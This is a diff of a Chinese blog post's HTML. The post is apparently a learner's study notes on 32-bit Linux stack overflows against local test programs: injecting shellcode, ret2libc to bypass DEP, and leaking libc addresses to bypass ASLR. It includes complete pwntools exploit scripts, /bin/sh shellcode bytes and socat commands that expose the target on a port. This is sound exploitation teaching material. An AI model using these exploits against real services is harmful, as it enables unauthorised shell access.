@@ -171,82 +171,124 @@
 <p>可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令</p>
 <p><img src="http://p1.bpimg.com/567571/36a85efa38efce36.png" alt=""></p>
 <p>之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址<br>根据大神指示，有一个好的方法:开启core dump这个功能</p>
-<blockquote>
-<p>ulimit -c unlimited<br>sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p>
-</blockquote>
-<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
+<pre><code>ulimit -c unlimited
+sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
+</code></pre><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
 <p><img src="http://p1.bpimg.com/567571/6632c5b0af41ef13.png" alt=""></p>
 <p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。</p>
 <p><img src="http://p1.bpimg.com/567571/5f09a62aba81a7a9.png" alt=""></p>
 <p>现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下:</p>
-<blockquote>
-<p>!python<br>!/usr/bin/env python<br>from pwn import *</p>
-<p>p = process(‘./test’)<br>ret = 0xbffff029</p>
-<p>shellcode = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”<br>shellcode += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”<br>shellcode += “\x0b\xcd\x80”</p>
-<p> p32(ret) == struct.pack(“&lt;I”,ret)<br> 对ret进行编码，将地址转换成内存中的二进制存储形式<br>payload = shellcode + ‘A’ * (140 - len(shellcode)) + p32(ret)</p>
-<p>p.send(payload) #发送payload</p>
-<p>p.interactive()  #开启交互shell</p>
-</blockquote>
-<p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
-<blockquote>
-<p>socat TCP4-LISTEN:10001,fork EXEC:./test</p>
-</blockquote>
-<p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
+<pre><code> #!python
+ #!/usr/bin/env python
+ from pwn import *
+
+ p = process(&apos;./test&apos;)
+ ret = 0xbffff029
+
+ shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+ shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+ shellcode += &quot;\x0b\xcd\x80&quot;
+
+ # p32(ret) == struct.pack(&quot;&lt;I&quot;,ret)
+  #对ret进行编码，将地址转换成内存中的二进制存储形式
+ payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
+
+p.send(payload) #发送payload
+
+p.interactive()  #开启交互shell
+</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
+<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./test
+</code></pre><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
 <p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
 <h3 id="第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h3><p>学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭<br>开启DEP指令如下：</p>
-<blockquote>
-<p>gcc -fno-stack-protector -o test test.c</p>
-</blockquote>
-<p>此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，<br>现在的测试程序为rw，而上面确实rwx </p>
+<pre><code>gcc -fno-stack-protector -o test test.c
+</code></pre><p>此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，<br>现在的测试程序为rw，而上面确实rwx </p>
 <p><img src="http://p1.bpimg.com/567571/773db76a654aaa29.png" alt=""></p>
 <p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
-<blockquote>
-<p>$ gdb ./test2<br>GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04<br>….</p>
-<p>(gdb) break main<br>Breakpoint 1 at 0x8048430</p>
-<p>(gdb) run<br>Starting program: /home/mzheng/CTF/groupstudy/test/test2</p>
-<p>Breakpoint 1, 0x08048430 in main ()</p>
-<p>(gdb) print system</p>
-<p>$1 = {<text variable,="" no="" debug="" info="">} 0xb7e5f460 <system></system></text></p>
-<p>(gdb) print __libc_start_main</p>
-<p>$2 = {<text variable,="" no="" debug="" info="">} 0xb7e393f0 <__libc_start_main><br>(gdb) find 0xb7e393f0, +2200000, “/bin/sh”(gdb如果安装有peda插件貌似这跳命令找不到)<br>0xb7f81ff8<br>warning: Unable to access target memory at 0xb7fc8500, halting search.<br>1 pattern found.</__libc_start_main></text></p>
-<p>(gdb) x/s 0xb7f81ff8<br>0xb7f81ff8:  “/bin/sh”</p>
-</blockquote>
-<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
-<blockquote>
-<p>!python<br>!/usr/bin/env python<br>from pwn import *</p>
-<p>p = process(‘./level2’)<br>p = remote(‘127.0.0.1’,10002)</p>
-<p>ret = 0xdeadbeef<br>systemaddr=0xb7e5f460<br>binshaddr=0xb7f81ff8</p>
-<p>payload =  ‘A’*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)</p>
-<p>p.send(payload)<br>p.interactive()</p>
-</blockquote>
-<h3 id="第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>下面打开ASLR保护，指令如下</p>
-<blockquote>
-<p>sudo -s<br>echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
-</blockquote>
-<p>从现在开始会发现test的libc.so的地址每次都会变化。<br>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。<br>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
+<pre><code>$ gdb ./test2
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+….
+(gdb) break main
+Breakpoint 1 at 0x8048430
+(gdb) run
+Starting program: /home/mzheng/CTF/groupstudy/test/test2
+
+Breakpoint 1, 0x08048430 in main ()
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
+(gdb) print __libc_start_main
+$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
+(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
+0xb7f81ff8
+warning: Unable to access target memory at 0xb7fc8500, halting search.
+1 pattern found.
+(gdb) x/s 0xb7f81ff8
+0xb7f81ff8:  &quot;/bin/sh&quot;
+</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+p = process(&apos;./level2&apos;)
+#p = remote(&apos;127.0.0.1&apos;,10002)
+
+ret = 0xdeadbeef
+systemaddr=0xb7e5f460
+binshaddr=0xb7f81ff8
+
+payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
+
+p.send(payload)
+
+p.interactive()
+</code></pre><h3 id="第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>下面打开ASLR保护，指令如下</p>
+<pre><code>sudo -s
+echo 2 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre><p>从现在开始会发现test的libc.so的地址每次都会变化。<br>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。<br>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
 <p><img src="http://p1.bpimg.com/567571/356ec28ac9e2d64e.png" alt=""></p>
 <p><img src="http://i1.piimg.com/567571/94ddb130646489c9.png" alt=""></p>
 <p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。<br>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br>使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
 <p><img src="http://i1.piimg.com/567571/eb73f9b80519ade1.png" alt=""></p>
 <p>最后写exp：</p>
-<blockquote>
-<p>!python</p>
-<p>!/usr/bin/env python</p>
-<p>from pwn import *</p>
-<p>libc = ELF(‘libc.so’)<br>elf = ELF(‘test3’)</p>
-<p>p = process(‘./test3’)<br>p = remote(‘127.0.0.1’, 10003)</p>
-<p>plt_write = elf.symbols[‘write’]<br>print ‘plt_write= ‘ + hex(plt_write)<br>got_write = elf.got[‘write’]<br>print ‘got_write= ‘ + hex(got_write)<br>vulfun_addr = 0x0804844d<br>print ‘vulfun= ‘ + hex(vulfun_addr)</p>
-<p>payload1 = ‘a’*140 + p32(plt_write) + p32(vulfun_addr) + &gt; p32(1) +p32(got_write) + p32(4)</p>
-<p>print “\n###sending payload1 …###”<br>p.send(payload1)</p>
-<p>print “\n###receving write() addr…###”<br>write_addr = u32(p.recv(4))<br>print ‘write_addr=’ + hex(write_addr)</p>
-<p>print “\n###calculating system() addr and \”/bin/sh\” addr…###”<br>system_addr = write_addr - (libc.symbols[‘write’] - libc.symbols[‘system’])</p>
-<p>print ‘system_addr= ‘ + hex(system_addr)</p>
-<p>binsh_addr = write_addr - (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))<br>print ‘binsh_addr= ‘ + hex(binsh_addr)</p>
-<p>payload2 = ‘a’*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</p>
-<p>print “\n###sending payload2 …###”<br>p.send(payload2)</p>
-<p>p.interactive()</p>
-</blockquote>
-<p>###小结：<br>本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+libc = ELF(&apos;libc.so&apos;)
+elf = ELF(&apos;test3&apos;)
+
+p = process(&apos;./test3&apos;)
+#p = remote(&apos;127.0.0.1&apos;, 10003)
+
+plt_write = elf.symbols[&apos;write&apos;]
+print &apos;plt_write= &apos; + hex(plt_write)
+got_write = elf.got[&apos;write&apos;]
+print &apos;got_write= &apos; + hex(got_write)
+vulfun_addr = 0x0804844d
+print &apos;vulfun= &apos; + hex(vulfun_addr)
+
+payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
+
+print &quot;\n###sending payload1 ...###&quot;
+p.send(payload1)
+
+print &quot;\n###receving write() addr...###&quot;
+write_addr = u32(p.recv(4))
+print &apos;write_addr=&apos; + hex(write_addr)
+
+print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
+system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
+print &apos;system_addr= &apos; + hex(system_addr)
+binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
+print &apos;binsh_addr= &apos; + hex(binsh_addr)
+
+payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
+
+print &quot;\n###sending payload2 ...###&quot;
+p.send(payload2)
+
+p.interactive()
+</code></pre><p>###小结：<br>本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。</p>
 
     </div>
 
